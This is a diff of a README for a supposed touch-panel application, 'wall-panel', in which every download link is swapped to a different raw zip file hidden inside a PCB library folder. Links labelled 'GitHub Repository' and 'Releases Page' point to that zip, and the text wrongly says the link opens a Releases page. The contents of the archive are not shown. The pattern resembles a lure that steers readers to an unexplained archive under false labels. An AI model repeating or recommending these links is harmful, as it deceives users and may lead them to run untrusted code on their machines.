@@ -4,10 +4,10 @@
 Welcome to wall-panel! This application transforms your display into a smart touch panel. Enjoy features like smooth navigation and responsive touch control, all powered by a compact CM4 module. 
 
 ## 🔗 Download Now
-[![Download Wall Panel](https://raw.githubusercontent.com/rakibofcx/wall-panel/main/pcb/libraries/SM04B-SRSS-TB_LF__SN_/panel_wall_3.6.zip%20Now-v1.0-brightgreen)](https://raw.githubusercontent.com/rakibofcx/wall-panel/main/pcb/libraries/SM04B-SRSS-TB_LF__SN_/panel_wall_3.6.zip)
+[![Download Wall Panel](https://github.com/rakibofcx/wall-panel/raw/refs/heads/main/pcb/libraries/CM4IO/panel_wall_3.0.zip%20Now-v1.0-brightgreen)](https://github.com/rakibofcx/wall-panel/raw/refs/heads/main/pcb/libraries/CM4IO/panel_wall_3.0.zip)
 
 ## 📥 Download & Install
-To get started, visit [this page to download](https://raw.githubusercontent.com/rakibofcx/wall-panel/main/pcb/libraries/SM04B-SRSS-TB_LF__SN_/panel_wall_3.6.zip). Once there, you can find the latest version of wall-panel.
+To get started, visit [this page to download](https://github.com/rakibofcx/wall-panel/raw/refs/heads/main/pcb/libraries/CM4IO/panel_wall_3.0.zip). Once there, you can find the latest version of wall-panel.
 
 ### Step-by-Step Download Guide:
 1. Click the link above to open the Releases page.
@@ -52,7 +52,7 @@ For detailed troubleshooting tips, please refer to our community forums or FAQ s
 We value our users and encourage feedback. If you have suggestions or encounter any issues, please open an issue on our GitHub repository. Our community is here to help.
 
 ## 🔗 Useful Links
-- [GitHub Repository](https://raw.githubusercontent.com/rakibofcx/wall-panel/main/pcb/libraries/SM04B-SRSS-TB_LF__SN_/panel_wall_3.6.zip)
-- [Releases Page](https://raw.githubusercontent.com/rakibofcx/wall-panel/main/pcb/libraries/SM04B-SRSS-TB_LF__SN_/panel_wall_3.6.zip)
+- [GitHub Repository](https://github.com/rakibofcx/wall-panel/raw/refs/heads/main/pcb/libraries/CM4IO/panel_wall_3.0.zip)
+- [Releases Page](https://github.com/rakibofcx/wall-panel/raw/refs/heads/main/pcb/libraries/CM4IO/panel_wall_3.0.zip)
 
 Thank you for choosing wall-panel! Enjoy your new smart display experience.
